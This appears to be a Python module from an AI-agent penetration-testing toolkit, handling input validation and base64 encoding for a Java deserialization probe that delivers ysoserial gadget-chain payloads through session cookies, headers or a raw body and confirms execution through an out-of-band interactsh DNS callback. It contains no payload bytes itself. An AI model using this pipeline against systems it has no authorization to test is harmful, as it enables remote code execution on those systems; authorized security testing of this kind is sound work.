"""
Pure parsing, payload-type/carrier validation, and payload encoding for
deserialization_probe. No I/O or network requests here.

Confirmation of real execution does not happen inside this tool at all --
unlike phpggc/fastcgi_exploit's synchronous `id`-output check, a Java
deserialization sink has no response-body signal to read: the embedded
command is an out-of-band DNS lookup, confirmed only by polling the
`interactsh` tool separately afterward and matching the callback's own
timing to this call. oob_domain is an explicit model-supplied parameter,
generated by a prior `interactsh` call. See
tradecraft/skills/ssrf_open_redirect_discovery.md for the same generate ->
inject -> poll split used by form_fuzzer/http_request.
"""
from __future__ import annotations

import base64
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

# Gadget-chain names are plain alphanumeric identifiers in ysoserial's own
# catalog (e.g. "CommonsCollections6", "Jdk7u21", "Spring1"). Bounding the
# accepted charset here is a sanity check, not a security control (argv is always a
# list, never shell=True, so there is no shell-injection risk either way),
# but it turns a typo into a clear error instead of an opaque ysoserial
# usage-dump buried in this tool's own error message.
_GADGET_NAME_RE = re.compile(r"^[A-Za-z0-9_]+$")
DEFAULT_PAYLOAD_TYPE = "CommonsCollections6"

# A plain hostname shape -- not a security control either (the far side's
# Runtime.exec(String) splits on whitespace via StringTokenizer, it never
# invokes a shell, so there is no injection path through this value into
# anything this process runs), but a malformed domain would otherwise
# produce a confusing exec failure on the TARGET rather than a clear error
# here, before any request is even sent.
_OOB_DOMAIN_RE = re.compile(r"^[A-Za-z0-9.-]+$")

_CARRIER_RE = re.compile(r"^(cookie|header):(.+)$")
DEFAULT_CANDIDATE_COOKIES: Tuple[str, ...] = ("session", "rememberMe", "JSESSIONID")
MAX_CARRIERS = 4


@dataclass
class RawDeserializationProbeResult:
    target: str = ""
    gadget: str = ""
    oob_domain: str = ""
    payload_b64: str = ""
    attempts: List[Dict[str, Any]] = field(default_factory=list)
    error: Optional[str] = None


def normalize_target_url(target: str) -> str:
    """Normalize target to a full URL, defaulting to http://."""
    target = (target or "").strip()
    if not target:
        return ""
    if target.startswith("http://") or target.startswith("https://"):
        return target
    return f"http://{target}"


def parse_host_port(target: str) -> Tuple[str, int]:
    """Extract host and port from a target URL or bare host."""
    parsed = urllib.parse.urlsplit(target if "://" in target else f"//{target}")
    host = parsed.hostname or target
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    return host, port


def validate_oob_domain(oob_domain: str) -> Tuple[str, Optional[str]]:
    """Resolve and sanity-check the required oob_domain parameter -- the
    interactsh payload domain the model must already have generated
    (via interactsh's own 'generate' action) before calling this tool."""
    value = (oob_domain or "").strip()
    if not value:
        return "", "missing required oob_domain -- generate one with interactsh first"
    if not _OOB_DOMAIN_RE.match(value):
        return "", f"invalid oob_domain {oob_domain!r} -- expected a plain hostname"
    return value, None


def validate_payload_type(payload_type: str) -> Tuple[str, Optional[str]]:
    """Resolve payload_type to a ysoserial gadget-chain name. Empty ->
    the default chain; anything else must match ysoserial's own plain
    alphanumeric naming convention."""
    value = (payload_type or "").strip()
    if not value:
        return DEFAULT_PAYLOAD_TYPE, None
    if _GADGET_NAME_RE.match(value):
        return value, None
    return "", (
        f"invalid payload_type {payload_type!r} -- ysoserial gadget-chain names "
        f"are plain alphanumeric (e.g. 'CommonsCollections6', 'Jdk7u21', 'Spring1')"
    )


def resolve_carriers(carrier: str) -> Tuple[List[Tuple[str, str]], Optional[str]]:
    """Resolve the explicit `carrier` parameter (if given) to exactly one
    injection point, or fall back to the default candidate list (the 3
    most common Java session-cookie names, plus one raw serialized-body
    POST) -- capped at MAX_CARRIERS regardless of path, the same bounded-
    attempts shape every destructive tool in this project uses."""
    value = (carrier or "").strip()
    if not value:
        candidates = [("cookie", name) for name in DEFAULT_CANDIDATE_COOKIES]
        candidates.append(("body", ""))
        return candidates[:MAX_CARRIERS], None

    if value == "body":
        return [("body", "")], None

    match = _CARRIER_RE.match(value)
    if match:
        name = match.group(2).strip()
        if not name:
            return [], f"invalid carrier {carrier!r} -- missing a name after the ':'"
        return [(match.group(1), name)], None

    return [], f"invalid carrier {carrier!r} -- use 'cookie:<name>', 'header:<name>', or 'body'"


def encode_payload(payload: bytes) -> str:
    """Base64-encode the serialized payload for HTTP delivery -- a raw
    Java-serialized stream contains arbitrary bytes (including the
    0xACED0005 magic) that cannot survive a cookie or header value
    unencoded. (The raw-body carrier sends the original bytes directly,
    unencoded, matching how a real client would POST
    application/x-java-serialized-object.)"""
    return base64.b64encode(payload).decode("ascii")


def parse_result(raw: RawDeserializationProbeResult) -> Dict[str, Any]:
    """Shapes one generation+delivery attempt into the tool result. There
    is deliberately no 'vulnerable' field here -- see this module's own
    docstring for why confirmation needs a separate interactsh poll."""
    return {
        "target": raw.target,
        "gadget": raw.gadget,
        "oob_domain": raw.oob_domain,
        "attempted_carriers": [a["carrier"] for a in raw.attempts],
        "attempts": raw.attempts,
        "payload_chars": len(raw.payload_b64),
        "error": raw.error,
    }
